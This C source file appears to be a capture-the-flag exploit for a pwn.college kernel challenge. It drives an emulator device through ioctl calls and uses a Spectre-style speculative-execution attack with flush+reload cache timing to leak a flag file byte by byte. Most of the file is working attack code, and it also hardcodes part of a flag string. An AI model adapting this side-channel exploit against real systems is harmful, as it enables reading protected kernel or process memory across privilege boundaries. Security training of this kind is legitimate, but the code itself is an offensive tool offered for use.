#define _GNU_SOURCE
#include <stdio.h>
#include <sched.h>
#include <stdbool.h>
#include <fcntl.h>
#include <signal.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <x86intrin.h>
#include <setjmp.h>

#define CACHE_HIT_THRESHOLD 220
#define CACHE_LINE_SIZE 0x1000
#define BUFF_SIZE 255

char *shared_buffer;

void pre_work()
{
	uint8_t *addr;
	for (int i = 0; i < BUFF_SIZE; i++)
	{
		addr = shared_buffer + i * CACHE_LINE_SIZE;
		_mm_clflush(addr);
	}
}

uint64_t time_access_no_flush(void *p)
{
	uint64_t start, end;
	start = __rdtsc();
	volatile uint64_t x = *(volatile uint64_t *)p;
	_mm_mfence();
	end = __rdtsc();
	return end - start;
}

bool post_work_inner_work(int mix_i)
{
	uint8_t *addr;
	size_t cache_hit_threshold = CACHE_HIT_THRESHOLD;
	int index;
	uint64_t t_no_flush;
	index = mix_i * CACHE_LINE_SIZE;
	addr = shared_buffer + index;
	t_no_flush = time_access_no_flush(addr);
	// printf("cache hit %d timing:%lld\n", mix_i, t_no_flush);
	if (t_no_flush < cache_hit_threshold)
	{
		return true;
	}
	return false;
}

int post_work(int *stats)
{
	for (size_t i = 0; i < BUFF_SIZE; i++)
	{
		int mix_i = ((i * 167) + 13) % 255;
		if (post_work_inner_work(mix_i))
		{
			stats[mix_i]++;
		}
	}
}

void train_target(int fd)
{
	// clear yan85 code before exploit
	memset(shared_buffer, 0, 75 + 6);
	// setup yan85 code for training and speculate
	shared_buffer[0] = '\x00';
	shared_buffer[1] = '\x00';
	shared_buffer[2] = '\x00';
	shared_buffer[3] = '\x00';
	shared_buffer[4] = '\x02';
	shared_buffer[5] = '\x00';
	shared_buffer[6] = '\x20';
	shared_buffer[7] = '\x20';
	shared_buffer[9] = '\x04';
	shared_buffer[10] = '\x40';
	shared_buffer[11] = '\x04';
	for (int i = 0; i < 200; i++)
	{
		int mix_i = ((i * 167) + 13) % 128;
		((volatile char *)shared_buffer)[8] = mix_i;
		ioctl(fd, 0x539, 0);
	}
}

void speculate(int fd, int pos)
{
	// set a = 0x80, b = p -> stm a, b
	memset(shared_buffer, 0, 75 + 6);

	shared_buffer[0] = '\x00';
	shared_buffer[1] = '\x00';
	shared_buffer[2] = '\x00';
	shared_buffer[3] = '\x00';
	shared_buffer[4] = '\x02';
	shared_buffer[5] = '\x00';
	shared_buffer[6] = '\x20';
	shared_buffer[7] = '\x20';
	shared_buffer[8] = 0x80;
	shared_buffer[9] = '\x20';
	shared_buffer[10] = '\x40';
	shared_buffer[11] = '\x70';
	shared_buffer[12] = '\x08';
	shared_buffer[13] = '\x20';
	shared_buffer[14] = '\x40';

	// sys_exec
	shared_buffer[15] = '\x20';
	shared_buffer[16] = '\x20';
	shared_buffer[18] = '\x04';
	shared_buffer[19] = '\x40';
	shared_buffer[20] = '\x04';

	((volatile char *)shared_buffer)[17] = 0x81 + pos;
	ioctl(fd, 0x539, pos);
}

void bring_in_cachelines(int fd)
{
	// set a = 0x80, b = p -> stm a, b
	memset(shared_buffer, 0, 75 + 6);

	shared_buffer[0] = '\x00';
	shared_buffer[1] = '\x00';
	shared_buffer[2] = '\x00';
	shared_buffer[3] = '\x00';
	shared_buffer[4] = '\x02';
	shared_buffer[5] = '\x00';
	shared_buffer[6] = '\x20';
	shared_buffer[7] = '\x20';
	shared_buffer[8] = '\x80';
	shared_buffer[9] = '\x20';
	shared_buffer[10] = '\x40';
	shared_buffer[11] = '\x70';
	shared_buffer[12] = '\x08';
	shared_buffer[13] = '\x20';
	shared_buffer[14] = '\x40';
	ioctl(fd, 0x539, 0);
}

void read_flag(int fd)
{
	memset(shared_buffer, 0, 75 + 6);
	// yan85 sys open & read flag into yan memory + 0x81
	const int yan_code_len = 75;
	unsigned char yan85[] = {
		0x20, 0x20, 0x30, 0x20, 0x08, 0x01, 0x20, 0x40, 0x2f, 0x08, 0x20, 0x40,
		0x01, 0x20, 0x08, 0x20, 0x40, 0x66, 0x08, 0x20, 0x40, 0x01, 0x20, 0x08,
		0x20, 0x40, 0x6c, 0x08, 0x20, 0x40, 0x01, 0x20, 0x08, 0x20, 0x40, 0x61,
		0x08, 0x20, 0x40, 0x01, 0x20, 0x08, 0x20, 0x40, 0x67, 0x08, 0x20, 0x40,
		0x20, 0x20, 0x30, 0x20, 0x40, 0x00, 0x20, 0x08, 0x00, 0x04, 0x08, 0x02,
		0x40, 0x00, 0x02, 0x40, 0x20, 0x00, 0x20, 0x40, 0x81, 0x20, 0x08, 0x40,
		0x04, 0x20, 0x02, 0x20, 0x20, 0x20, 0x04, 0x40, 0x02};

	shared_buffer[0] = 0;
	shared_buffer[1] = 0;
	shared_buffer[2] = 0;
	shared_buffer[3] = '\x00';
	shared_buffer[4] = '\x02';
	shared_buffer[5] = '\x00';

	for (int i = 0; i < yan_code_len; i++)
	{
		shared_buffer[6 + i] = yan85[i];
	}

	ioctl(fd, 0x539, 0);
}

bool unsolved(int *result, int length)
{
	for (int i = 0; i < length; i++)
	{
		if (result[i] == 0)
		{
			return true;
		}
	}
	return false;
}

int exploit(int fd, int len)
{
	int *results = malloc(sizeof(int) * len);
	memset(results, 0, sizeof(int) * len);
	int max_index = 0;
	int max_val = 0;
	int stats[255] = {0};
	results[0] = 'p';
	results[1] = 'w';
	results[2] = 'n';
	results[3] = '.';
	results[4] = 'c';
	results[5] = 'o';
	results[6] = 'l';
	results[7] = 'l';
	results[8] = 'e';
	results[9] = 'g';
	results[10] = 'e';
	results[11] = '{';
	results[12] = 'I';
	results[21] = 'Y';
	results[22] = 'P';
	results[31] = '8';
	results[32] = 'b';
	results[38] = 'I';
	results[40] = '0';
	results[43] = '1';
	results[48] = 'c';
	results[49] = 'j';
	results[52] = 'I';
	results[14] = 'I';
	results[17] = 'X';
	results[23] = 'R';
	results[26] = 'X';
	results[35] = 'p';
	results[36] = 'q';
	results[37] = 'D';
	results[39] = '.';
	results[41] = 'F';
	results[42] = 'M';
	results[52] = 'w';
	results[53] = 'z';

	while (unsolved(results, len))
	{
		for (int i = 0; i < len; i++)
		{
			if (results[i] != '\x00')
			{
				continue;
			}
			for (int j = 0; j < 255; j++)
			{
				stats[j] = 0;
			}
			if (!unsolved(results, len))
			{
				break;
			}

			// work_loop
			for (int j = 0; j < 4000; j++)
			{
				pre_work();
				train_target(fd);
				pre_work();

				speculate(fd, i);
				post_work(stats);
			}

			max_val = 0;
			max_index = 0;
			for (int j = 0x20; j < 128; j++)
			{
				// printf("pos: %d, index: %d, stats[pos]: %d\n", i, j, stats[j]);
				if (stats[j] > max_val)
				{
					max_index = j;
					max_val = stats[j];
				}
			}

			if (max_index != 0 && max_val > 1)
			{
				results[i] = max_index;
				printf("index %d found %d = %c with %d hits\n", i, max_index, max_index, stats[max_index]);
				//}
				printf("Current results\n");
				for (int j = 0; j < len; j++)
				{
					printf("index: %d value: %c\n", j, results[j]);
				}
				for (int l = 0; l < len + 1; l++)
				{
					printf("%c", results[l]);
				}
				puts("\n");
			}
		}
	}

	for (int l = 0; l < len + 1; l++)
	{
		printf("%c", results[l]);
	}

	FILE *fp = fopen("lvl6flag", "a");
	for (int l = 0; l < len + 1; l++)
	{
		fprintf(fp, "%c", results[l]);
	}

	fclose(fp);
}

void set_affinity()
{
	cpu_set_t set;
	CPU_ZERO(&set);
	CPU_SET(0, &set);
	sched_setaffinity(0, sizeof(set), &set);
}

int main(int argc, char **argv)
{
	set_affinity();

	char *challenge = "/proc/ypu";
	int fd = openat(AT_FDCWD, challenge, O_RDWR);

	// mmap
	shared_buffer = (char *)mmap(0, 255 * 0x1000, PROT_WRITE | PROT_READ, MAP_SHARED, fd, 0);

	read_flag(fd);

	exploit(fd, 55);

	return 0;
}